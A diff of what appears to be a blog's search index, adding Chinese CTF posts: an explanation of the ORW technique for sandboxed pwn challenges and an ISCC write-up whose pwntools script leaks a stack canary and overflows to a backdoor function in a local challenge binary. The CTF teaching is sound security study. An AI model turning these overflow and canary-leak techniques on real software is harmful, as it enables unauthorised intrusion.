@@ -4,6 +4,62 @@
   
     
     <entry>
+      <title>pwn-ORW</title>
+      <link href="/posts/153dbd9f.html"/>
+      <url>/posts/153dbd9f.html</url>
+      
+        <content type="html"><![CDATA[<h1>pwn知识-ORW</h1><p>在CTF赛事中，越来越多的题目启用了沙箱，会禁用掉<code>execve</code>函数，从而达到让我们构造不出来<code>system('/bin/sh\x00')</code>来<code>getshell</code>的效果，这个时候我们就可以利用<strong>orw</strong>来解题。</p><h2 id="原理">原理</h2><p>见名知意，<code>ORW</code>与三个函数有关：<code>open</code>、<code>read</code>、<code>write</code>，他们的作用分别是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open打开想要读取的文件</span><br><span class="line">read将打开的文件内容读取</span><br><span class="line">write将读取到的内容输出</span><br></pre></td></tr></table></figure><h2 id="攻击方式">攻击方式</h2><p>在知晓大概的流程之后，就得设置寄存器的参数，我们需要知道函数对应参数代表的含义：<br><code>open(file,oflag)</code>,<code>read(fd,buf,n_bytes)</code>,<code>write(fd,buf,n_bytes)</code>。<br><strong>open</strong><br><code>file</code>就是我们要读取的文件名，<code>oflag</code>指的是我们以何种方式打开文件，如只读，只写，可读可写。一般我们设置<code>oflag=0</code>，默认打开，只读即可。<br><strong>read</strong>，<strong>write</strong>，这两个大同小异。<br><code>fd</code>是文件描述符，通过设置它来决定函数的操作，通常设置为<code>0</code>，表示标准输入，但是在<code>ORW</code>中，我们需要设置<code>read</code>的<code>fd</code>参数为<code>3</code>，表示从文件中读取，则<code>buf</code>中存放的就是读入文件内容的地址，<code>n_bytes</code>就是能够存入多少字节的数据。<code>write</code>的<code>fd</code>设置为<code>1</code>，输出到终端。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>外网打点-信息收集</title>
+      <link href="/posts/6e1eba3b.html"/>
+      <url>/posts/6e1eba3b.html</url>
+      
+        <content type="html"><![CDATA[<h1>外网打点</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 信息收集 </tag>
+            
+            <tag> 外网打点 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>盘古石计算机取证大赛-WP</title>
       <link href="/posts/ef89deac.html"/>
       <url>/posts/ef89deac.html</url>
@@ -18,6 +74,14 @@
       </categories>
       
       
+        <tags>
+            
+            <tag> 盘古石杯 </tag>
+            
+            <tag> 电子取证 </tag>
+            
+        </tags>
+      
     </entry>
     
     
@@ -27,7 +91,7 @@
       <link href="/posts/5bbfef93.html"/>
       <url>/posts/5bbfef93.html</url>
       
-        <content type="html"><![CDATA[<h1>pwn</h1><h2 id="pwn01-genius">pwn01-genius</h2><p>You are a genius?<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101155336.png" alt="alt text"><br>开启NX以及cannary保护<br>IDA反编译查看，找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101156338.png" alt="alt text"><br>程序从main函数开始，依次满足条件从function1执行到3，触发栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101157376.png" alt="alt text"></p>]]></content>
+        <content type="html"><![CDATA[<h1>pwn</h1><h2 id="pwn01-genius">pwn01-genius</h2><p>You are a genius?<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101155336.png" alt="alt text"><br>开启NX以及cannary保护<br>IDA反编译查看，找到后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101156338.png" alt="alt text"><br>程序从main函数开始，依次满足条件从function1执行到3，触发栈溢出。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505101157376.png" alt="alt text"><br>我们重点看这里<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505131748416.png" alt="alt text"><br>看第一段读取，它会将存在栈上的<code>buf</code>格式化输出出来，并且这里存在溢出，所以我们在这里利用栈溢出来泄露<code>cannary</code>的值。<br>并且，<code>init()</code>函数是后门函数<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/202505131751046.png" alt="image.png.png"><br>所以我们泄露出<code>cannary</code>的值后利用<code>gets()</code>栈溢出到后门函数这里即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;you are a genius,yes or no?&quot;</span>, <span class="string">b&#x27;no&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Sir, don&#x27;t be so modest.&quot;</span>, <span class="string">b&#x27;thanks&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">backdoor_addr = <span class="number">0x04011A6</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x19</span>  </span><br><span class="line">  </span><br><span class="line">sh.sendafter(<span class="string">b&#x27;what you want in init&#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x19</span>)  </span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">log.success(<span class="string">f&quot;cannary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="comment"># gdb.attach(sh)  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(<span class="number">0x04011B8</span>) + p64(backdoor_addr)  </span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;thank you&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -36,6 +100,14 @@
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> ISCC </tag>
+            
+        </tags>
       
     </entry>
     
@@ -190,7 +262,9 @@
       
         <tags>
             
-            <tag> CTF,PWN </tag>
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
             
         </tags>
       
